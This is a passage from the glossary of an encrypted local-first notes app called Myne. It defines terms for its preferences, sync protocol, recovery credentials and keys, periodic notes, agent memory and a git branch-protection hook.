**Why capture rather than draw.** A picture of an interface, drawn by hand, drifts from the interface on its own schedule and nobody is told. All three imitations had, and none of them knew [ornament](#ornament-primitive) existed — so a theme selecting a thick frame or a scanline texture previewed as a plain rectangle everywhere a person looked *before* installing. A snapshot cannot drift on its own because nobody writes it.

**It stays alive because a theme is applied the way the app applies one.** The capture is taken under the default theme with no ornament selected; a palette then reaches it as custom properties on the root plus `data-o-*` attributes, which resolve at paint time — so a static document re-themes completely. What does NOT re-theme is a value hardcoded in an inline style, and that is the honest half: the preview shows a theme changing precisely what it can change in the real app, including the places it still cannot reach (the debt `scripts/check-token-adoption.mjs` tracks).

**It can go stale, and that is a warning rather than a gate.** `scripts/check-preview-freshness.mjs` reports when the surfaces the snapshot depicts have changed since it was taken. Most UI changes do not change what it shows, and re-capturing needs a Linux container (tauri-driver has no macOS support), so a hard gate would be routed around rather than heeded — the same posture as `check-twin-drift.mjs`.

Used in: `decisions.md` 2026-08-08


### **PrefsView** &nbsp; 🛠️ *Tooling*

Rust struct (and matching TypeScript IPC payload type) shape of the decrypted `vault.prefs` plaintext. Defines the v0.1 preference fields — `screen_capture_protection: bool` (MYND-160), `deliberate_folders` (set array, MYND-144), `auto_lock_seconds` (optional integer, MYND-121), `editor_layout` (optional nested object, MYND-137), the unified manual sidebar [`item_order`](#item-order) map (MYND-183/MYND-596, superseding the earlier `note_order` / `folder_order` pair — a container-keyed map of ordered sequences since MYND-596), [`favorites`](#favorites) (MYND-183) — an ordered string array whose element order is preserved verbatim — and the [theme preference](#theme-preference) `theme` (optional `"light"`/`"dark"`, absent ≡ system, MYND-110) — plus the `Default` impl that drives the fall-back-to-defaults semantic on absence / AEAD-fail / parse-fail (`spec/protocol.md` §9.5.5). Serialized via canonical JSON (sorted keys, no whitespace, NFC strings, no floats; set arrays sorted+deduped, sequence arrays order-preserved) before AEAD encryption — drift-detected by the `myne-test-vectors` byte-stable KAT vectors.

Used in: `src-tauri/src/plugins/prefs/`; `protocol/src/prefs.rs`; `spec/protocol.md` §9.5

### **Protected-branch guard** &nbsp; 🛠️ *Tooling*

*(Aliases: none. Myne-divergent: no.)*

The `protected-branch` lefthook `pre-push` command carried by every `myne-md` repository. It refuses a push whose **remote** ref is `refs/heads/develop`, `refs/heads/main` or `refs/heads/release`, matching the remote ref rather than the current branch name so that `git push origin HEAD:develop` from a feature branch, and a branch deletion, are caught by the same line. `release` is on the list because it is the branch that deploys: `myne-website` maps `release` to production and `develop` to staging, so a `develop`-only guard protected the branch with no blast radius. It exists because the real control is unavailable: the org is on the GitHub free plan with private repositories, so both the branch-protection API and the rulesets API answer 403 on every repo.

**Hygiene, not enforcement**, which is the hook's own wording rather than a hedge added here. `--no-verify`, `LEFTHOOK=0` and `LEFTHOOK_EXCLUDE=protected-branch` each bypass it, and it exists only in clones where `lefthook install` has been run, so a fresh clone, the jailed runner and `myne-bot` are uncovered. Two hatches are sanctioned instead: `MYNE_ALLOW_PROTECTED_PUSH=1` for a one-off, and `git config myne.allowProtectedPush true` for a repository whose normal workflow genuinely is a direct push ([internal-service](#internal-service), `homebrew-tap`, `myne-branding`). Both parse a VALUE (`1`, `true`, `yes`, `on`, case-insensitively) and refuse anything else, so they agree on what "allow" means and `=0` keeps the guard on rather than switching it off. The flag is read with `git config --local` deliberately, since a plain `--get` reads the merged cascade and one `--global` setting would switch the guard off in all eleven clones at once. A `min_version` at the top of each `lefthook.yml` is what stops an older binary from silently dropping `use_stdin` and leaving the guard green and inert.

Used in: `lefthook.yml` (every `myne-md` repo); root `AGENTS.md`; `scripts/hooks-parity-check.sh`; `decisions.md` 2026-08-27

### **per-account quota** &nbsp; 📦 *Product*

The Phase 2 hosted-sync storage ceiling: per-account aggregate **deduplicated** ciphertext bytes (AS17 — one stored blob is counted once, not once per referencing note). Keyed on the account, never on identity beyond `account_number_hash`; a self-host operator sets their own ceiling (the protocol exposes the counter, the operator sets policy — TB5). Distinct from the [per-account rate-limit](#per-account-rate-limit) (bytes-at-rest vs request-frequency). Phase 2.

Used in: `spec/server-protocol.md` §5

### **per-account rate-limit** &nbsp; 📦 *Product*

The Phase 2 abuse bound: a per-account **token-bucket keyed on `account_number_hash`**, **never on IP** (C4 / AS14 — the server keeps no persistent IP log; TLS sees the connection IP transiently and discards it). Abuse mitigation is therefore designed in around per-account counters from the start, not retrofitted as IP bans. Bounds the damage a Sybil/abusive account can do; primary Sybil resistance on hosted is the payment-gate (the payment system is MYND-430). Phase 2.

Used in: `spec/server-protocol.md` §5

### **per-blob sync-meta** &nbsp; 📋 *Protocol*

The small, server-visible descriptor a Phase 2 [pull](#sync-cursor) returns for each changed content blob: `(uuid, version, content_nonce, size)`. The client uses it to decide what to fetch — `content_nonce` is the decryption-free staleness discriminator (§9.6.4), `version` the server's opaque per-note counter (AS6), `size` the AS17 quota unit. It exposes nothing the server doesn't already hold (the [vault head](#vault-head) commits the same `content_nonce`s); the client never trusts it for integrity — that is the head's job. Phase 2.

Used in: `spec/sync-protocol.md` §8

### **per-device token** &nbsp; 🗝️ *Key/identifier*

The revocable bearer credential a device receives after a successful SCRAM handshake + [device-approval gate](#device-approval-gate) (`spec/server-protocol.md` §3.1), carried as `Authorization: Bearer <token_hex>` on every authed sync request. It is **distinct from** the [device_id](#device_id-vv-actor): the token is a secret, rotatable *availability* credential, whereas `device_id` is permanent, non-secret [version-vector](#version-vector-vv) history (SYNC-2 — revoking the token never touches `device_id`). Revoking it (the "Remove device" action) stops that device syncing but is **not** forward-secret and **not** a remote wipe — a removed device keeps whatever it already synced (v0.1 offers no cryptographic re-key; that is a later-version/MLS matter, `threat-model.md` §7). Stored device-locally in the OS keychain (`thisDeviceOnly`) with a documented weaker `0600`-file fallback (SYNC-16). Phase 2.

Used in: `spec/server-protocol.md` §3.1, §4 (SYNC-2, MYND-425)

### **per-vault namespace** &nbsp; 📋 *Protocol*

The Phase 2 server storage layout: each vault's ciphertext blobs live in a namespace scoped to that vault — there is **no global content-addressed bucket**. Because attachment-ids are vault-scoped keyed-HMAC (`protocol.md` §9.9), cross-vault deduplication is **structurally impossible** (and undesired — a global bucket would be a known-file confirmation oracle). Dedup is intra-vault only; quota (AS17) and the tombstone ledger are kept clean per vault. Phase 2.

Used in: `spec/server-protocol.md` §2

### **period anchor** &nbsp; 📦 *Product*

The single date a [periodic note](#periodic-note)'s title is formatted from: the FIRST day of the period the current instant falls in. Today for a daily note, that week's Monday for a weekly one, that month's first day for a monthly one. It is what makes "open this period" idempotent: every day inside one period yields the same anchor, so it yields the same title, so it resolves to the same note. Computed **per client**, and the rule is narrower than "honour the `timezone` pref wherever it is set": a client honours the override where it can also SHOW and CHANGE it (`decisions/storage/0556`). The desktop has that setting and applies it, so the date it shows and the date it files under are the same date. Mobile ships no control and displays nothing derived from the override, so it reads the device clock; the CLI reads the device clock and says so on stderr. The reason is that `timezone` is device-local as a MERGE class rather than as an exclusion from the blob, so a device enrolled after the override was set inherits it in the prefs seed without ever having offered it: applying an inherited zone on mobile would move which note a period command opens while changing nothing the user could see, explain or alter. The accepted cost, stated in that entry rather than implied here, is that a user whose override sits in a different calendar day from their device can hold one weekly note from the desktop and another from the phone, both real, both synced, and nothing reconciles them, because the match rule is folder plus title and nothing else. Distinct from the period's inclusive **bounds**, which the `{{period_start}}` / `{{period_end}}` [note-template](#note-template) tokens carry. (myne-md/myne#177)

Used in: `decisions/storage/0556`, `spec/protocol.md` §9.5.2

### **periodic note** &nbsp; 📦 *Product*

An ordinary `.myn` note representing one calendar period (a day, a week or a month), identified by **folder + title** exactly as a [daily note](#daily-note) is, and **not** a calendar object or date-indexed database. Three periods ship (daily, weekly, monthly); quarterly and yearly were deliberately cut. Each period configures a folder, a title format and an optional [note template](#note-template), and each has an "open this period" command that resolves idempotently: found → open, not found → create and open. Past periods are reached through the ordinary sidebar folder: no previous/next command, no picker, no calendar, which is the same line the daily note already drew (`vision.md`).

Daily keeps its three top-level `vault.prefs` fields; weekly and monthly live in the `periodic_notes` map, keyed `<period>.<setting>` (`spec/protocol.md` §9.5.2). The split is a sync property rather than a style: prefs merge per field, so a device on an older build would keep writing `daily_folder` while a newer one wrote the map, and nothing could say which is authoritative. A weekly title is an ISO 8601 week (`gggg-[W]ww`, Monday start, week-year rather than calendar year), frozen with no first-day-of-week setting because changing one would silently re-point every weekly note already on disk. (myne-md/myne#177)

Used in: `spec/protocol.md` §9.5.2; `spec/sync-protocol.md` §10.2

### **personal-agent layer** &nbsp; 📦 *Product*

The memory plus personality slice of the agent: what the agent distills from working with the user ([agent memory](#agent-memory)) and what the user tells it to sound like ([agent personality](#agent-personality)), persisted as synced vault content (`vault.agent-memory` `MYN1` + `memories/<id>` `MYX1`, `vault.personality` `MYZ1`) and injected into the agent's system turn as an `UntrustedNote` span (myne-md/myne#697). The name covers the storage pair plus the `remember` verb plus the injection, not a separate product surface.

Used in: `spec/protocol.md` §9.25-§9.27; `spec/sync-protocol.md` §10.2.6, §10.2.7; `decisions/ai/0590`

### **property** &nbsp; 📦 *Product*

A typed `key → value` pair derived from a note's YAML [frontmatter](#frontmatter) body by the Saved Views property-index (MYND-271). Every arbitrary frontmatter key is read and coerced to exactly one Myne type — `string` / `number` / `date` / `list` / `checkbox` — by the canonical value-typing ruleset (`spec/markdown-dialect.md` §3.6.4); the property-index is the **single type authority** for the Saved Views epic (sibling features consume its typing, never redefine it). Tags (`#tag` ∪ frontmatter `tags:`) and the `folder:` value are queryable alongside properties as pseudo-properties. The parse is read-only and non-mutating (the `.myn` file stays source of truth); the typed values live in the derived [vault.indices](#vaultindices) / `MYI1` cache. A [saved view](#saved-view) filters and sorts on properties.

Used in: `spec/markdown-dialect.md` §3.6, §3.6.4 (MYND-271)

### **protocol identifier** &nbsp; 📋 *Protocol*

The string `"myne-protocol-v0.1"` that names this specification. Distinct from the protocol version *byte* (`0x01`), the AAD prefix (`"myne.v0.1|"`), and the context-string prefix (`"myne.v0.1 "`). All four reference the same major version but appear in different call sites.

Used in: `spec/protocol.md` §1.3

### **protocol version** &nbsp; 📋 *Protocol*

The single-byte field at offset 4 of every Myne on-disk file (per-note `.myn` and `vault.meta`). v0.1 = `0x01`. Bound into the AAD of every AEAD operation so that any version downgrade fails the tag check.

Used in: `spec/protocol.md` §1.3, §10

### **React** &nbsp; 🛠️ *Tooling*

The UI library used for the Phase 1 desktop client UI inside the Tauri WebView, and the planned UI library for the Phase 3 web and mobile clients (the latter via React Native). React 19 with TypeScript per the scaffold. Chosen for the maturity of its CodeMirror 6 (`@uiw/react-codemirror`) integration — the largest UI dependency in the Phase 1 scope. (The graph view uses [d3-force](#d3-force) for layout with a hand-rolled canvas renderer rather than a React graph wrapper, so it adds no React-specific UI dependency — superseding the earlier `react-cytoscapejs` plan, `decisions.md` 2026-06-08.) The Phase 3 web client shares this UI by **compiling the same `src/` tree** rather than through an extracted package: the `packages/ui/` workspace member once anticipated here was not built and is not planned, because the only boundary that actually differs between the two clients is the platform seam (`src/platform/`), which the web build substitutes at build time (`decisions.md` 2026-07-26).

Used in: `decisions.md`; `threat-model.md` §7
Reference: https://react.dev

### **Reading view** &nbsp; 📦 *Product*

The read-only rendered [view mode](#view-mode) of a note tab (MYND-299): all editor [decorations](#decoration-layer) are applied, but the surface is non-editable and there is **no** [cursor-aware reveal](#cursor-aware-reveal) — markdown source never lifts, so the note reads as finished prose without edit chrome or markup flicker. Keystrokes are no-ops (an optional one-time "⇧⌘E to edit" hint tells the reader how to switch back). It reuses `CMEditor`'s `readOnly` path; §6 C1 keeps the underlying bytes untouched. The primary **Edit ⇄ Reading** toggle is `Mod-Shift-E`. The read-only [preview companion](#view-mode) pane is a side-by-side Reading mirror of the *same* buffer (a linked mirror, not a second `(kind,id)` instance — it preserves the one-editable-buffer-per-note invariant). Contrast [Source mode](#source-mode) (raw markdown, decorations off) and live preview (today's cursor-aware default). See also [view mode](#view-mode), [Source mode](#source-mode), [cursor-aware reveal](#cursor-aware-reveal).

Used in: `spec/protocol.md` §9.5.2, §9.7; `decisions.md` 2026-06-17 (MYND-299)

### **read-only grace** &nbsp; 📦 *Product*

The hosted-sync expiry ladder (`decisions.md` 2026-07-13): when a paid term lapses (or usage exceeds the tier ceiling after a downgrade), push is refused (402-class error) while **pull stays fully open for 90 days** — the user can always take their data out. At the end of grace the server-side vault ciphertext is deleted **atomically**: the server cannot see inside a vault, so selective/partial deletion is structurally meaningless — the server copy either stays whole or goes entirely. The account record (SCRAM verifier + device registry) is kept, and because Myne is local-first the deletion is not data loss — devices hold the plaintext and can re-push within the free tier or after renewal.

Used in: `decisions.md` 2026-07-13

### **reclaim floor** &nbsp; 📋 *Protocol*

The per-vault high-water mark of Layer-2 storage reclamation (`spec/sync-protocol.md` §11.3): the highest change-position whose tombstone body the server has dropped, keeping only `(uuid, final_version, marker)`. A pull whose cursor sits below the floor is rejected with `cursor_expired`, forcing a [full-reconcile](#full-reconcile) that carries an explicit reconcile flag exempting it from that check. Distinct from [blob reclaimed](#blob-reclaimed), which names one record's outcome; the floor is the vault-wide cursor boundary that outcome advances.

Used in: `spec/sync-protocol.md` §11.2, §11.3

### **Recovering** (slot state) &nbsp; 📦 *Product*

The intermediate variant of the [`Slot`] enum representing a vault that has successfully completed phrase-based recovery (`vault_recover_with_phrase`) but has not yet committed a new master password (`vault_complete_recovery`). Carries `root_key`, `items_key`, `items_key_id`, and `recovered_at: Instant` in `Zeroizing` wrappers — both keys are derived eagerly during the recovery step so the entire credential chain is verified before the slot transitions. Editor commands cannot pattern-match `Slot::Recovering` and are therefore structurally denied access during this window per `recovery-flow.md` §4.1's non-dismissible chained step. The only legal transitions out are `Slot::Recovering → Slot::Unlocked` (via `vault_complete_recovery` success) or `Slot::Recovering → Slot::Empty` (via `vault_lock` — the §4.3 within-session bail case).

Used in: `decisions.md` 2026-05-02 "Slot state machine + auth_permits generalization"

### **ImportSource** (slot state) &nbsp; 📦 *Product*

The read-only variant of the [`Slot`] enum, holding a second vault's keys for the length of a [vault import](#vault-import) (myne-md/myne#464). Carries `root_key`, `items_key`, `items_key_id` in `Zeroizing` wrappers plus `opened_at`, exactly as **Recovering** does, and for the same reason: the whole credential chain is verified when the slot is created rather than at first use. It is NOT an unlock and has no transition into one: every editor command matches `Slot::Unlocked` and so rejects it at compile time, and the only ways out are the import ending, the [target vault](#target-vault) locking or switching, and an independent 30-minute TTL swept by the idle timer. It does not count against the one-`Unlocked` invariant, because it is not an `Unlocked` entry: two vaults' keys can be resident at once, which is the one thing about this feature the threat model had to be amended for (`threat-model.md` A6).

Used in: `threat-model.md` A6, `decisions.md` 2026-08-30 "A vault opened for READING is a slot, not an unlock"
### **removal clock** &nbsp; 📋 *Protocol*

The per-entry timestamp that lets a set-union preference express a DELETION (myne-md/myne#613). A union alone cannot: an entry removed on one device is an absence, indistinguishable from "this device never had the entry", so the peer's copy is restored by the next union and the deletion undoes itself within two rounds, with no concurrency required. The clock is the tombstone that makes the difference legible.

Stamped on `<field>/<entry>` in the [field clock](#field-clock) map for the three CLOCKED set fields, [deliberate folder](#deliberate-folder), [archived folder](#archived-folder) and the spell-language set. **A removal is a stamped absence**: the removing side stamps the key, and a single-sided entry is dropped when the absent side's clock is strictly greater than the present side's. Equal clocks keep the entry, "absent sorts lowest", which is the recoverable direction. **An addition is stamped too**, which the per-key maps do not need: without an add stamp a re-added entry carries no clock of its own and loses to its own tombstone permanently, so a folder deleted and later refilled could never come back. A clock is retained even when neither side holds the entry, indefinitely, because dropping it lets a third device that still holds the entry at an older clock resurrect what two others deleted.

**The two egress controls deliberately have none.** [AI-excluded folder](#ai-excluded-folder) and [CLI-excluded folder](#cli-excluded-folder) keep the clockless monotone union: a removal clock orders un-exclusion by wall clock, so a forward-skewed device could unexclude a folder no correctly-clocked device can restore, and the failure direction there is note plaintext leaving the device. The cost, stated rather than implied, is that once a second device holds an exclusion it is add-only. See [set-field byte budget](#set-field-byte-budget), which the retained clocks are measured against.

Used in: `spec/sync-protocol.md` §10.2, `spec/protocol.md` §9.5.2; myne-md/myne#613

### **recovery kit** &nbsp; 📦 *Product*

The single saveable artifact handed over at vault creation, carrying both the 24-word [recovery phrase](#recovery-phrase) and the vault's [account number](#account_number) (myne-md/myne#468). Before this the phrase and the account number were separate steps; the kit presents them together as plain text to save or copy, and the user's one acknowledgement covers the whole sheet. The account number identifies the vault for a second device and is never stored or re-displayed on the device itself, so creation is the only point at which it can be captured. The phrase and the account number landing in one artifact is a deliberate concentration and the reason `threat-model.md` TB3 records it: each alone is insufficient, the pair is account takeover.

Used in: `spec/recovery-flow.md` §2.2, `decisions/ui/0642`, `threat-model.md` TB3

### **recovery drill** &nbsp; 📦 *Product*

The read-only check that a saved recovery phrase still opens the vault that is open now (myne-md/myne#468). It derives `recovery_wrap_key` from the entered phrase, attempts the AEAD-open of `enc_root_key_recovery`, discards the derived key, and answers a boolean. It performs no slot transition and writes nothing, so it is not a recovery: a caller who is only checking is not forced through a password reset. It is unlock-gated and rides the shared `auth_permits` budget, which is what bounds it as a verification oracle, since a caller with an unlocked vault already holds the plaintext. On the web client it is the second place the phrase is entered, alongside a user-started recovery, which is why it amends A18 (`decisions/security/0645`).

Used in: `spec/recovery-flow.md` §3.6, `decisions/security/0640`, `decisions/security/0645`, `threat-model.md` A18

### **recovery phrase** &nbsp; 🗝️ *Key/identifier* (deep entry)

The 24-word BIP-39-encoded representation of 256 bits of secret entropy plus an 8-bit checksum, used as Myne's secondary credential for vault unlock. Generated at vault creation from OS CSPRNG output, presented to the user with a forced-confirmation flow before vault creation completes (`spec/protocol.md` §7.2; full UX in `spec/recovery-flow.md` §2). The phrase string, after NFKD normalization, is fed directly to Argon2id with `salt_recovery` to derive `recovery_wrap_key`. **Myne does not use BIP-39's standard PBKDF2-HMAC-SHA512 derivation** — that step is replaced by Argon2id with the same parameters as the password path. The phrase is never sent to any server. If the user loses both the phrase and the master password, the vault is permanently unrecoverable; this is a hard architectural commitment.

Used in: `spec/protocol.md` §7, `spec/recovery-flow.md`

### **recovery_wrap_key** &nbsp; 🗝️ *Key/identifier*

The 32-byte key derived from the recovery phrase via Argon2id with `salt_recovery`. Encrypts the second of the two copies of `root_key` in `vault.meta` (`enc_root_key_recovery`).

Used in: `spec/protocol.md` §3.1, §7

### **recurrence chip** &nbsp; 📦 *Product*

The inline rendering of a task line's `repeat` field as a compact pill (MYND-614), the sibling of the [due-date chip](#due-date-chip). Its label is the [recurrence rule](#recurrence-rule) **localized for display** while the file keeps the canonical English form — the chip carries the display label and the source bytes as separate values, so a localized label can never travel back into a write.

**A rule outside the closed vocabulary is not chipped at all** (MYND-615): it renders as raw source text with the same subtle failure hint a malformed date gets, plus a note of the consequence — this task will not repeat. Until the vocabulary existed the chip flagged nothing, because flagging every rule would have been worse than flagging none; now that it exists, an unreadable rule must *look* unread. The field is also registered in the spell-check skip set, or a rule made of ordinary dictionary words (`every 3 days`) would be underlined as a spelling error.

Used in: `spec/markdown-dialect.md` §3.8, §3.8.7; `decisions.md` 2026-07-28

### **recurrence rule** &nbsp; 📦 *Product*

The expression a [line-task](#line-task)'s `repeat` [task inline field](#task-inline-field) carries, drawn from a **closed** three-tier vocabulary frozen normatively in `spec/markdown-dialect.md` §3.8.7: plain intervals (`every 3 days`), weekday sets (`every monday and friday`), and calendar positions in a month (`last friday of every month`, `day 31 of every month`).

**Closed on purpose.** A general implementation of a recurrence standard is an *evaluator*, and admitting one would put a second execution surface into a dialect that refuses `onCompletion` for exactly that reason. The user never types a rule — they choose it from a control — which is what makes a closed vocabulary honest rather than restrictive.

Rules are **stored in canonical English and displayed localized**: a file carrying two languages would become unreadable to its own owner on a differently-configured device. An expression outside the vocabulary is preserved verbatim and surfaced as unrecognized, never approximated and **never defaulted** — see [unrecognized rule](#unrecognized-rule). Rules divide into the [interval rule](#interval-rule) and [ordinal rule](#ordinal-rule) families, which differ in whether they drift.

Used in: `spec/markdown-dialect.md` §3.8.3, §3.8.7; `decisions.md` 2026-07-28

### **reference build environment** &nbsp; 🛠️ *Tooling*

*(Aliases: reference platform.)*

The build environment a published hash is defined against, so that "reproducible" names a property someone can actually check. For the web bundle it is a **`linux/amd64` container built from `web/container/Dockerfile`**, and the qualifier is load-bearing rather than pedantic: cargo hashes `rustc -vV` (whose `host:` line names the build machine's triple) into every crate's `-C metadata`, rustc folds that into `StableCrateId`, and symbol names then feed codegen-unit partitioning. So the same commit built on a different host architecture produces a different wasm artefact, and every content-hashed chunk importing it renames. Reaching the reference platform is not a privilege of matching hardware: an arm64 machine gets the byte-identical result through emulation (`docker buildx --platform linux/amd64`), which is what keeps the check available to every verifier rather than to whoever owns the right CPU. Distinct from building to **serve**: a self-hoster builds natively for their own architecture and needs no comparison, because they read the source themselves. Their users did not, so an instance other people rely on is built in the reference environment or its users are told no published row will match it.

The scope is across hosts and **not yet across time**: the three base images in that Dockerfile are floating tags, so the environment can move under a row written before it moved. `web-bundle-hashes.md` records that residual beside the claim. See also [reproducible builds](#reproducible-builds).

Used in: `web-bundle-hashes.md`; `self-host-web.md`; `decisions.md` 2026-08-15

### **reference link** &nbsp; 📦 *Product*

A CommonMark link that names a [link reference definition](#link-reference-definition) instead of carrying its URL inline: full `[text][label]`, collapsed `[text][]` (label = the text), or shortcut `[label]`. Myne v0.1 recognizes and **renders** reference links — a usage whose label resolves against a definition shows its visible text as a link and its definition line hides off-cursor — while a dangling reference (no matching definition) stays plain text. Rendering is cursor-aware and byte-preserving (§6 C1); the canonical emit form for new links is the inline `[text](url)`, so reference links are recognized and rendered but **never emitted**. Distinguished from an inline link by the parse tree (a reference link has a `LinkLabel` child or no `URL`); resolution uses the shared collector, since the parser alone emits a node even for a broken full reference. See also [link reference definition](#link-reference-definition), [decoration layer](#decoration-layer).

Used in: `spec/markdown-dialect.md` §3.2, §5; `decisions.md` 2026-05-30

### **region (keyboard region)** &nbsp; 📦 *Product*

One of the **three keyboard destinations** the editor window is divided into: the notes sidebar, the editor pane, and the right panel (myne-md/myne#728). Each is a single Tab stop with roving navigation inside it, and **F6** cycles between them; each is also separately bindable, though only the cycle ships with a default chord. A region is **declared in the DOM**, by a `data-region` attribute on its root, rather than registered in a store: the three are rendered by three different components and any of them can be absent (a collapsed sidebar, a non-note tab with no right panel), and a store has to be told a region has gone while an attribute is simply not there. The same three roots carry the page's landmarks (`navigation`, `main`, `complementary`), so "jump to the sidebar" means the same place to a keyboard user and to a screen-reader user. A collapsed pane is skipped because its content is `inert`, which the shell already sets for the collapse animation, and the region model reads that rather than being told about it.

**The right panel has three user-visible names and this is the one to use.** The strings added with the region model say **"right panel"**, which is what the published user guide calls it and what this entry calls it. Shipped strings from before the pass call the same surface the **"backlinks sidebar"** ("Toggle backlinks sidebar", "Resize backlinks sidebar"), which is narrower than the surface became once it grew tabs, and a fourth draft of the region strings briefly called it the **"side panel"** until review caught the third name arriving in one change. The older strings are deliberately left alone rather than renamed here: they are correct enough, and rewording a shipped surface invalidates its translation in 31 catalogs, which is a product decision rather than an accessibility fix. Anything NEW says "right panel".

**Not [focus mode](#focus-mode), and not [line-focus dimming](#line-focus-dimming).** Focus mode is a *presentation* state that fades the chrome so only the words remain; line-focus dimming is a reading aid inside one note. A region is a *navigation* concept and is always present: it exists whether or not focus mode is on, changes nothing about what is drawn, and is about where the keyboard can go rather than about what the eye should rest on. The three collide in prose ("focus the editor region" versus "focus mode") and nowhere else.

Used in: `decisions/ui/0599`; `src/lib/regions.ts`, `src/commands/bindableCatalog.ts` (`focus.cycle-region`, `focus.sidebar`, `focus.editor`, `focus.right-panel`), `e2e/a11y-keyboard.e2e.ts`

### **remember verb** &nbsp; 📦 *Product*

The fourth verb of [agentic note editing](#agentic-note-editing) (myne-md/myne#697): it writes one memory entry, not a note, carrying `entry_id` (absent mints, present overwrites) and `text`. The only model-initiated write that does not end in the review screen (`decisions/ai/0591`): the run loop caps it at one write per run, threads the writing run's id and the folders it read as provenance, and the memory plugin's write-time gate (schema, 2000-character cap, injection scan, authorship, exclusion) runs inside. Removal stays a user act in the memory UI; the model has no delete verb. Advertised to the model in the prompt's action list, or the feature is inert.

Used in: `spec/protocol.md` §9.25, §9.26; `decisions/ai/0590`; `decisions/ai/0591`

### **remind** &nbsp; 📦 *Product*

The [task inline field](#task-inline-field) naming a [reminder instant](#reminder-instant) — the moment the user wants to be nudged about a [line-task](#line-task). One of the five fields Myne writes.

**Absolute, not an offset from the due date.** An offset would survive recurrence more gracefully, but it cannot express a reminder on a task that has no due date at all — "remind me Tuesday to call my mother" — and that case is real. The cost is paid in recurrence instead: the anchor is `due` if present, else `remind`; the anchor advances by the rule and the other field shifts by the *same interval*, so the gap between them is carried rather than recomputed.

Used in: `spec/markdown-dialect.md` §3.8.2; `decisions.md` 2026-07-28

### **reminder instant** &nbsp; 📦 *Product*

The value a [`remind`](#remind) field carries: a date, optionally with a wall-clock time of day.

***Myne-divergent*** in one respect a reader must know: it carries **no UTC offset and no IANA zone identifier**. "09:00" means 09:00 wherever the user is — which is what a personal reminder means, and which keeps a coarse geolocation datum out of a file that gets exported as plaintext. A value carrying an offset does not type at all: it is preserved verbatim and surfaced as unparsed rather than being silently shifted into local time.

Used in: `spec/markdown-dialect.md` §3.8.3; `decisions.md` 2026-07-28

### **rename journal** &nbsp; 📋 *Protocol*

The empty `.rename-journal` marker file in a vault's notes directory that makes a [wikilink](#wikilink)-rename's multi-note rewrite **all-or-nothing**. A title rename rewrites the renamed note's own `.myn` blob plus every inbound `[[…]]`-bearing note; because a single per-blob atomic write is not collectively atomic across N blobs, the writer stages every updated blob to `<uuid>.myn.tmp`, writes the (content-free) marker, then commits every rename, then clears the marker. On the next vault-open — before the resolution index rebuilds — recovery rolls **forward** (marker present ⇒ rename all staged `.tmp` into place) or **back** (marker absent ⇒ delete orphan `.tmp`), so a crash mid-commit never leaves a half-renamed vault with broken title-keyed links. The marker carries no data (no UUIDs, no titles), is not a magic-byte format, and is excluded from backups; rolled-forward blobs are still AEAD/CTX-verified on read, so it adds no tamper surface. See also [wikilink](#wikilink), [wikilink chip](#wikilink-chip).

Used in: `spec/protocol.md` §9.12, §9.11.3; `decisions.md` 2026-06-13

### **report-don't-empty** &nbsp; 📋 *Protocol*

The read semantic for load-bearing synced singletons ([conversation catalog](#conversation-catalog), per-conversation files): a store that fails any check (absent under a live roster entry, magic/version mismatch, AEAD failure, over-cap, unparseable payload) surfaces an error naming it, and is never collapsed to the empty value. Collapsing would let the next write persist emptiness over real records; refusing keeps the roster (the index of record) intact while the failure is surfaced.

Used in: `spec/protocol.md` §9.23.3, §9.24.4; `decisions/ai/0581`

### **reproducible builds** &nbsp; 🛠️ *Tooling*

Build artifacts that can be regenerated bit-for-bit from public source code by independent third parties. Part of the compensating-controls plan in lieu of a paid third-party audit.

**Shipped for the web bundle and the server image; not for desktop.** The commitment used to be stated for all three, and `threat-model.md` §6 corrected that on 2026-08-15 (entry 0496) rather than leave a control the project does not have: desktop artifacts are built locally, are not reproducible, and with every `myne-md` repository private have no public source to be reproduced *from*. The web bundle's guarantee carries its own qualifier: it holds in a [reference build environment](#reference-build-environment), not on every host, because the build machine's target triple reaches the emitted wasm (entry 0498).

Used in: `threat-model.md` §6
Reference: https://reproducible-builds.org

### **restore (from backup)** &nbsp; 📦 *Product*

Recreating a vault from a [vault backup file](#vault-backup-file): the file is validated credential-free (container structure + per-member SHA-256 + structural parse of the embedded `vault.meta`), staged into a discovery-invisible directory, then committed atomically as a fresh `vaults/<id>/` (new `VaultId` minted; the backup carries none). The restored vault starts locked and unlocks with the master password **or** the recovery phrase, exactly like the original — both credential wraps travel inside the copied `vault.meta`. Identity collisions (same `account_number_hash` already on disk) surface a user choice: keep both side-by-side, or replace the existing vault only after the restore has fully succeeded. Default handling of a damaged backup is all-or-nothing rejection; an explicit salvage mode restores intact members with an honest skipped-list summary. Restoring an old backup is a whole-vault replay — see `threat-model.md` §7.

Used in: `spec/protocol.md` §9.11; `threat-model.md` §7; `decisions.md` 2026-06-10

### **review axis** &nbsp; 📦 *Product*

A view-time control in the design-system catalogue that changes how the stage is drawn rather than what the story is, applied to every story with no per-story opt-out (myne-md/myne#847): right-to-left, reduced motion and forced colors. Each is carried in the URL alongside the theme, so one link reproduces what was on screen. Reduced motion and forced colors do not invent a policy: they mirror the matching media rules onto a marker attribute, so the axis shows an existing behaviour, and a forced axis that mirrors zero rules warns rather than rendering as "nothing changed". Two candidates did not survive contact with the code: compact density is a width-to-boolean function (`settingsCompact` over a `ResizeObserver`), so the viewport preset is what exercises it, and text scale is `editor_text_size`, the editor's own base size rather than a global mechanism. Contrast [Documentation node](#documentation-node).

Used in: `stories/README.md`; `decisions/ui/0653`

### **root_key** &nbsp; 🗝️ *Key/identifier* (deep entry)

The cryptographic core of a Myne vault. A 32-byte random value generated by the OS CSPRNG at vault creation. **Not derived from the password** — instead, two copies are stored on disk encrypted under independent wrap keys (`password_wrap_key` and `recovery_wrap_key`), per the dual-credential wrap pattern. Held in client memory only between unlock and lock; zeroized on lock or process exit. Every Myne subkey (the `server-auth` reservation, the active `itemsKey_wrap_key`, the `backup-key` reservation) is derived from `root_key` via the `derive_key` helper. The architecture is essential to recovery — if `root_key` were a function of the password, losing the password would unconditionally destroy the vault.

Used in: `spec/protocol.md` §3.1

### **run restore point** &nbsp; 📦 *Product*

The snapshot set an [agent run](#agent-run) takes over every note it is about to write, grouped by the run's id so the whole run reverts as one action. Captured **before** the write, past the snapshot coalescing window, and **a failure to capture it blocks the apply**: the restore point is the only thing that makes an agent edit reversible, so writing without it would apply an irreversible change while the interface has told the user it can be undone. The existing transactional multi-note write deliberately captures no snapshot (a rename is a deterministic, mechanically reversible rewrite) and that stays true; the capture is added at the agent's own call site.

Used in: `decisions.md` 2026-08-16

